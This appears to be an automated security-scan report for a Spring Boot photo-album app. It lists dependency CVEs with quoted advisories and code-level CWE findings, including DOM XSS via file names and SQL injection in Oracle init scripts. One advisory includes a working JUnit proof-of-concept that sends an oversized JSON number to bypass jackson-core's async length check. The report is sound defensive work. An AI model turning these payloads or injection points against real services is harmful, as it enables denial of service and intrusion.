This issue affects Spring Security: from 5.7.0 through 5.7.21, from 5.8.0 through 5.8.23, from 6.3.0 through 6.3.14, from 6.4.0 through 6.4.14, from 6.5.0 through 6.5.8, from 7.0.0 through 7.0.3.

### CVE-2026-18401: jackson-core: Number Length Constraint Bypass in Async Parser Leads to Potential DoS Condition
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:78

[CVE-2026-18401](https://github.com/advisories/GHSA-72hv-8253-57qq): jackson-core: Number Length Constraint Bypass in Async Parser Leads to Potential DoS Condition

Severity: MEDIUM

Affected resolved dependencies:
  - com.fasterxml.jackson.core:jackson-core:2.19.0 (compile; via spring-boot-starter-json at pom.xml:78); affected range >= 2.19.0, < 2.21.1

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.21.1 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
### Summary
The non-blocking (async) JSON parser in `jackson-core` bypasses the `maxNumberLength` constraint (default: 1000 characters) defined in `StreamReadConstraints`. This allows an attacker to send JSON with arbitrarily long numbers through the async parser API, leading to excessive memory allocation and potential CPU exhaustion, resulting in a Denial of Service (DoS).

The standard synchronous parser correctly enforces this limit, but the async parser fails to do so, creating an inconsistent enforcement policy.

### Details
The root cause is that the async parsing path in `NonBlockingUtf8JsonParserBase` (and related classes) does not call the methods responsible for number length validation.

- The number parsing methods (e.g., `_finishNumberIntegralPart`) accumulate digits into the `TextBuffer` without any length checks.
- After parsing, they call `_valueComplete()`, which finalizes the token but does **not** call `resetInt()` or `resetFloat()`.
- The `resetInt()`/`resetFloat()` methods in `ParserBase` are where the `validateIntegerLength()` and `validateFPLength()` checks are performed.
- Because this validation step is skipped, the `maxNumberLength` constraint is never enforced in the async code path.

### PoC
The following JUnit 5 test demonstrates the vulnerability. It shows that the async parser accepts a 5,000-digit number, whereas the limit should be 1,000.

```java
package tools.jackson.core.unittest.dos;

import java.nio.charset.StandardCharsets;

import org.junit.jupiter.api.Test;

import tools.jackson.core.*;
import tools.jackson.core.exc.StreamConstraintsException;
import tools.jackson.core.json.JsonFactory;
import tools.jackson.core.json.async.NonBlockingByteArrayJsonParser;

import static org.junit.jupiter.api.Assertions.*;

/**
 * POC: Number Length Constraint Bypass in Non-Blocking (Async) JSON Parsers
 *
 * Authors: sprabhav7, rohan-repos
 * 
 * maxNumberLength default = 1000 characters (digits).
 * A number with more than 1000 digits should be rejected by any parser.
 *
 * BUG: The async parser never calls resetInt()/resetFloat() which is where
 * validateIntegerLength()/validateFPLength() lives. Instead it calls
 * _valueComplete() which skips all number length validation.
 *
 * CWE-770: Allocation of Resources Without Limits or Throttling
 */
class AsyncParserNumberLengthBypassTest {

    private static final int MAX_NUMBER_LENGTH = 1000;
    private static final int TEST_NUMBER_LENGTH = 5000;

    private final JsonFactory factory = new JsonFactory();

    // CONTROL: Sync parser correctly rejects a number exceeding maxNumberLength
    @Test
    void syncParserRejectsLongNumber() throws Exception {
        byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);
		
		// Output to console
        System.out.println("[SYNC] Parsing " + TEST_NUMBER_LENGTH + "-digit number (limit: " + MAX_NUMBER_LENGTH + ")");
        try {
            try (JsonParser p = factory.createParser(ObjectReadContext.empty(), payload)) {
                while (p.nextToken() != null) {
                    if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {
                        System.out.println("[SYNC] Accepted number with " + p.getText().length() + " digits — UNEXPECTED");
                    }
                }
            }
            fail("Sync parser must reject a " + TEST_NUMBER_LENGTH + "-digit number");
        } catch (StreamConstraintsException e) {
            System.out.println("[SYNC] Rejected with StreamConstraintsException: " + e.getMessage());
        }
    }

    // VULNERABILITY: Async parser accepts the SAME number that sync rejects
    @Test
    void asyncParserAcceptsLongNumber() throws Exception {
        byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);

        NonBlockingByteArrayJsonParser p =
            (NonBlockingByteArrayJsonParser) factory.createNonBlockingByteArrayParser(ObjectReadContext.empty());
        p.feedInput(payload, 0, payload.length);
        p.endOfInput();

        boolean foundNumber = false;
        try {
            while (p.nextToken() != null) {
                if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {
                    foundNumber = true;
                    String numberText = p.getText();
                    assertEquals(TEST_NUMBER_LENGTH, numberText.length(),
                        "Async parser silently accepted all " + TEST_NUMBER_LENGTH + " digits");
                }
            }
            // Output to console
            System.out.println("[ASYNC INT] Accepted number with " + TEST_NUMBER_LENGTH + " digits — BUG CONFIRMED");
            assertTrue(foundNumber, "Parser should have produced a VALUE_NUMBER_INT token");
        } catch (StreamConstraintsException e) {
            fail("Bug is fixed — async parser now correctly rejects long numbers: " + e.getMessage());
        }
        p.close();
    }

    private byte[] buildPayloadWithLongInteger(int numDigits) {
        StringBuilder sb = new StringBuilder(numDigits + 10);
        sb.append("{\"v\":");
        for (int i = 0; i < numDigits; i++) {
            sb.append((char) ('1' + (i % 9)));
        }
        sb.append('}');
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }
}

```


### Impact
A malicious actor can send a JSON document with an arbitrarily long number to an application using the async parser (e.g., in a Spring WebFlux or other reactive application). This can cause:
1.  **Memory Exhaustion:** Unbounded allocation of memory in the `TextBuffer` to store the number's digits, leading to an `OutOfMemoryError`.
2.  **CPU Exhaustion:** If the application subsequently calls `getBigIntegerValue()` or `getDecimalValue()`, the JVM can be tied up in O(n^2) `BigInteger` parsing operations, leading to a CPU-based DoS.

### Suggested Remediation

The async parsing path should be updated to respect the `maxNumberLength` constraint. The simplest fix appears to ensure that `_valueComplete()` or a similar method in the async path calls the appropriate validation methods (`resetInt()` or `resetFloat()`) already present in `ParserBase`, mirroring the behavior of the synchronous parsers.

**NOTE:** This research was performed in collaboration with [rohan-repos](https://github.com/rohan-repos)

### CVE-2026-24400: AssertJ has XML External Entity (XXE) vulnerability when parsing untrusted XML via isXmlEqualTo assertion
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:84

[CVE-2026-24400](https://github.com/advisories/GHSA-rqfh-9r24-8c9r): AssertJ has XML External Entity (XXE) vulnerability when parsing untrusted XML via isXmlEqualTo assertion

Severity: HIGH

Affected resolved dependencies:
  - org.assertj:assertj-core:3.27.3 (test; via spring-boot-starter-test at pom.xml:84); affected range >= 1.4.0, <= 3.27.6

Recommended fix:
  - org.assertj:assertj-core: upgrade to 3.27.7 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
An XML External Entity (XXE) vulnerability exists in `org.assertj.core.util.xml.XmlStringPrettyFormatter`: the `toXmlDocument(String)` method initializes `DocumentBuilderFactory` with default settings, without disabling DTDs or external entities. This formatter is used by the `isXmlEqualTo(CharSequence)` assertion for `CharSequence` values.

An application is vulnerable only when it uses untrusted XML input with one of the following methods:

- `isXmlEqualTo(CharSequence)` from `org.assertj.core.api.AbstractCharSequenceAssert`
- `xmlPrettyFormat(String)` from `org.assertj.core.util.xml.XmlStringPrettyFormatter`

### Impact

If untrusted XML input is processed by the methods mentioned above (e.g., in test environments handling external fixture files), an attacker could:

- **Read arbitrary local files** via `file://` URIs (e.g., `/etc/passwd`, application configuration files)
- **Perform Server-Side Request Forgery (SSRF)** via HTTP/HTTPS URIs
- **Cause Denial of Service** via "Billion Laughs" entity expansion attacks

### Mitigation

`isXmlEqualTo(CharSequence)` has been deprecated in favor of [XMLUnit](https://www.xmlunit.org/) in version 3.18.0 and will be removed in version 4.0. Users of affected versions should, in order of preference:

1. Replace `isXmlEqualTo(CharSequence)` with XMLUnit, or
2. Upgrade to version 3.27.7, or
3. Avoid using `isXmlEqualTo(CharSequence)` or `XmlStringPrettyFormatter` with untrusted input.

`XmlStringPrettyFormatter` has historically been considered a utility for `isXmlEqualTo(CharSequence)` rather than a feature for AssertJ users, so it is deprecated in version 3.27.7 and removed in version 4.0, with no replacement.

### References

- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

### CVE-2026-41001: Spring Boot: Predictable Temp Directory in Artemis Auto-configuration
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:98

[CVE-2026-41001](https://github.com/advisories/GHSA-ggg2-9786-hwc8): Spring Boot: Predictable Temp Directory in Artemis Auto-configuration

Severity: MEDIUM

Affected resolved dependencies:
  - org.springframework.boot:spring-boot-autoconfigure:3.5.0 (compile; via spring-boot-devtools at pom.xml:98); affected range >= 3.5.0, <= 3.5.14

Recommended fix:
  - org.springframework.boot:spring-boot-autoconfigure: upgrade to 3.5.15 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
Spring Boot's ArtemisEmbeddedConfigurationFactory uses a fixed, static path for the embedded Artemis message broker's data directory when no explicit path is configured. A local attacker on the same host can pre-create this predictable directory or place a symlink before the application starts.

Affected versions:
Spring Boot 4.0.0 through 4.0.6; 3.5.0 through 3.5.14; 3.4.0 through 3.4.16; 3.3.0 through 3.3.19; 2.7.0 through 2.7.33.

### CVE-2026-40973: Spring Boot accepts predictable temp directory without ownership verification
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:98

[CVE-2026-40973](https://github.com/advisories/GHSA-wwpq-f5c3-7hvx): Spring Boot accepts predictable temp directory without ownership verification

Severity: HIGH

Affected resolved dependencies:
  - org.springframework.boot:spring-boot:3.5.0 (compile; via spring-boot-devtools at pom.xml:98); affected range >= 3.5.0, < 3.5.14

Recommended fix:
  - org.springframework.boot:spring-boot: upgrade to 3.5.14 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
A local attacker on the same host as the application may be able to take control of the directory used by `ApplicationTemp`. When `server.servlet.session.persistent` is set to `true` and the attack persists across application restarts, this may allow the attacker to read session information and hijack authenticated users or deploy a gadget chain and execute code as the application's user.

Affected: Spring Boot 4.0.0–4.0.5 (fix 4.0.6), 3.5.0–3.5.13 (fix 3.5.14), 3.4.0–3.4.15 (fix 3.4.16), 3.3.0–3.3.18 (fix 3.3.19), 2.7.0–2.7.32 (fix 2.7.33); predictable temp directory / `ApplicationTemp` ownership verification. Versions that are no longer supported are also affected per vendor advisory.

### CVE-2026-40972: Spring Boot DevTools remote secret comparison is vulnerable to timing attacks
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:98

[CVE-2026-40972](https://github.com/advisories/GHSA-56v8-86gj-66jp): Spring Boot DevTools remote secret comparison is vulnerable to timing attacks

Severity: HIGH

Affected resolved dependencies:
  - org.springframework.boot:spring-boot-devtools:3.5.0 (compile; via spring-boot-devtools at pom.xml:98); affected range >= 3.5.0, < 3.5.14

Recommended fix:
  - org.springframework.boot:spring-boot-devtools: upgrade to 3.5.14 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
An attacker on the same network as the remote application may be able to utilize a timing attack to discover information about the remote secret. In extreme circumstances this could result in the attacker determining the secret and uploading changed classes, thereby achieving remote code execution in the remote application.

Affected: Spring Boot 4.0.0–4.0.5 (fix 4.0.6), 3.5.0–3.5.13 (fix 3.5.14), 3.4.0–3.4.15 (fix 3.4.16), 3.3.0–3.3.18 (fix 3.3.19), 2.7.0–2.7.32 (fix 2.7.33); DevTools remote secret comparison. Versions that are no longer supported are also affected per vendor advisory.

### CVE-2025-41249: Spring Framework annotation detection mechanism may result in improper authorization
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:84

[CVE-2025-41249](https://github.com/advisories/GHSA-jmp9-x22r-554x): Spring Framework annotation detection mechanism may result in improper authorization

Severity: HIGH

Affected resolved dependencies:
  - org.springframework:spring-core:6.2.7 (compile; via spring-boot-starter-test at pom.xml:84); affected range >= 6.2.0, <= 6.2.10

Recommended fix:
  - org.springframework:spring-core: upgrade to 6.2.11 or later in a supported release line

Applicability: dependency/version match, not proof that application configuration meets every exploit prerequisite. Test-only dependencies are explicitly identified above.

Advisory details:
The Spring Framework annotation detection mechanism may not correctly resolve annotations on methods within type hierarchies with a parameterized super type with unbounded generics. This can be an issue if such annotations are used for authorization decisions.

Your application may be affected by this if you are using Spring Security's @EnableMethodSecurity feature.

You are not affected by this if you are not using @EnableMethodSecurity or if you do not use security annotations on methods in generic superclasses or generic interfaces.

This CVE is published in conjunction with  CVE-2025-41248 https://spring.io/security/cve-2025-41248 .


## CWE Findings (Code-Level Vulnerabilities)

### CWE-606: Unchecked Input for Loop Condition
- **Category:** Code Quality
- **Severity:** potential
- **Story Points:** 3
- **Files:** src/main/java/com/photoalbum/controller/HomeController.java, src/main/resources/application.properties

HomeController.uploadPhotos:58-70 takes the caller-controlled multipart List<MultipartFile> and processes every entry in its for loop, invoking a service transaction and image-header parser for each file. The only list check (line 63) tests null/empty; app.file-upload.max-files-per-upload=10 at application.properties:30 is never consumed or enforced. An authenticated caller can therefore submit substantially more than the configured ten files and force per-part database/image work; the 50MB total-request cap limits aggregate bytes but is not a bound on the application file-count loop. Impact is bounded by the servlet multipart byte/part limits and requires upload authentication; no infinite or truly unbounded loop is claimed.

### CWE-789: Memory Allocation with Excessive Size Value
- **Category:** Code Quality
- **Severity:** potential
- **Story Points:** 5
- **Files:** src/main/java/com/photoalbum/controller/HomeController.java, src/main/java/com/photoalbum/service/impl/PhotoServiceImpl.java, src/main/java/com/photoalbum/repository/PhotoRepository.java, src/main/java/com/photoalbum/model/Photo.java, src/main/java/com/photoalbum/config/SecurityConfig.java, Dockerfile

Public GET / invokes HomeController.index:38-42 -> PhotoServiceImpl.getAllPhotos:54-56 -> PhotoRepository.findAllOrderByUploadedAtDesc:23-29. The unpaginated query selects photo_data for every stored row and returns List<Photo>; Photo.photoData:39-41 is a BLOB byte[] with no lazy-loading annotation. Consequently one gallery request materializes the entire accumulated image collection into heap although thumbnails only need metadata. Uploads can add 10MB per photo and collection size has no application bound. A collection of roughly 52 maximum-sized photos already exceeds the configured Dockerfile:28 512MB JVM heap before ORM/list overhead, and concurrent anonymous gallery requests amplify allocation. This is a source-confirmed excessive aggregate allocation path, not an image-dimension overflow claim; the precise OOM threshold is deployment-dependent and was not load-tested.

### CWE-778: Insufficient Logging
- **Category:** Credentials & Secrets
- **Severity:** potential
- **Story Points:** 3
- **Files:** src/main/java/com/photoalbum/config/SecurityConfig.java, src/main/resources/application.properties, src/main/resources/application-docker.properties, src/main/java/com/photoalbum/controller/DetailController.java

SecurityConfig.securityFilterChain:46-59 enables HTTP Basic for upload/delete but configures no authentication failure handler, authentication/authorization event listener, security audit repository, or request audit logger. No other production source defines such a listener. Default Spring Security successful/failed Basic-auth diagnostics are DEBUG, while supplied logging configuration enables DEBUG for application/Spring Web only (application.properties:32-34) and restricts Spring Web to WARN in Docker (application-docker.properties:29-32); Spring Security remains at default INFO. Failed credentials are rejected in the security filter before upload/delete controller logging, so brute-force/unauthorized attempts have no persistent security audit record under the supplied configuration. DetailController.deletePhoto:67-75 records only photo ID/result without requesting principal or client address. This concerns application-provided/default logging; an external ingress/SIEM could supply additional logging, but none is represented in this repository. No credential values are included.

### CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **Category:** Injection Attacks
- **Severity:** optional
- **Story Points:** 8
- **Files:** src/main/resources/static/js/upload.js, src/main/java/com/photoalbum/controller/HomeController.java, src/main/java/com/photoalbum/service/impl/PhotoServiceImpl.java

upload.js handleFiles (lines 71-82) incorporates externally supplied File.name into validation messages; showErrors (lines 214-218) concatenates each message directly into innerHTML without encoding. A victim selecting or dropping a specially named file can therefore cause attacker-supplied markup/event attributes to be parsed in the gallery origin, including the validation-failure path before authentication or upload. Separately createPhotoCard (lines 184-188) interpolates the uploaded originalFileName into attributes and markup and displayNewPhotos inserts it with insertAdjacentHTML (line 158); HomeController.uploadPhotos returns that original filename at line 78 after PhotoServiceImpl.uploadPhoto stores it unchanged (lines 155-159). Requires a crafted file selected/dropped or an authenticated upload; the server-rendered Thymeleaf gallery uses escaped attributes/text, so this is not claimed as automatically executing for all later gallery visitors. Source-confirmed DOM injection; browser tool was unavailable for execution testing.

### CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
- **Category:** Injection Attacks
- **Severity:** mandatory
- **Story Points:** 13
- **Files:** oracle-init/01-create-user.sh, oracle-init/create-user.sh

Oracle initialization interpolates deployment-provided APP_USER (uppercased but not SQL-escaped) directly into the single-quoted username comparison (01-create-user.sh:17,19-28; create-user.sh:19,22-30), and constructs EXECUTE IMMEDIATE strings containing both that username and the externally supplied schema credential. These values cross a shell-expanded SQL*Plus heredoc into PL/SQL source without bind variables or SQL-literal/identifier encoding; quote characters can terminate the intended SQL literal and alter the PL/SQL submitted as SYSTEM. Credential content is [REDACTED]. This is a deployment/startup configuration injection boundary, not a remotely reachable HTTP SQL-injection claim; exploitation requires influence over these environment values. The HTTP repository queries themselves use fixed SQL and @Param binding.

